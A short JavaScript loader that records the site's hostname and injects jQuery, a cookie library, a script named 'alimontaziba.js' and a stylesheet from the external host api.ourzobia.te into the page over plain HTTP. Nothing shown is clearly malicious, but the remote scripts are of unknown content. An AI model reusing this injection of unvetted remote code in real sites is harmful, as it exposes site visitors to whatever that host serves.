var loc = window.location.hostname;
var domain = encodeURIComponent(loc); 

var request;
var url;
 
if (typeof url === "undefined") {
	url = "http://api.ourzobia.te/";
} 

if (typeof $ === 'undefined') {
	var script = document.createElement("script"); 
	script.src = "include.jquery.js"; 
	document.getElementsByTagName("head")[0].appendChild(script);
} 

var script1 = document.createElement("script");
script1.async = true;
script1.src = url+"resources/js.cookie.js";
script1.setAttribute('crossorigin','*');
document.getElementsByTagName("head")[0].appendChild(script1);

var script2 = document.createElement("script");
script2.async = true;
script2.src = url+"resources/alimontaziba.js";
script2.setAttribute('crossorigin','*');
document.getElementsByTagName("head")[0].appendChild(script2);

var style = document.createElement("link");
style.rel = "stylesheet";
style.href = url+"resources/alimon.css"; 
document.getElementsByTagName("head")[0].appendChild(style);
